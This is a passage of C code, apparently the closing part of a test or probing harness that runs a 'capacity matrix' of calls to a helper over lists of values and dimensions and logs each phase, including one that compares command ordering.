        for (size_t i = 0; i < sizeof(vals)/sizeof(vals[0]); i++)
            cm_dim_fresh("M", 1, 1, vals[i], 0, 0);
        for (size_t i = 0; i < sizeof(vals)/sizeof(vals[0]); i++)
            cm_dim_fresh("M", 1, 1, 0, vals[i], 0);
    }

    /* phase N: the same, but with the group created first (the old order),
       to show the difference the session bit makes */
    CM_LOG("[cm] --- N: cmd=64 after a cmd=3 create (old order) ---");
    {
        static const uint64_t dims[] = { 1,2,64,16384 };
        for (size_t i = 0; i < sizeof(dims)/sizeof(dims[0]); i++)
            cm_dim_fresh("N", 1, dims[i], 0, 0, 1);
    }

    CM_LOG("[cm] === capacity matrix done ===");
}
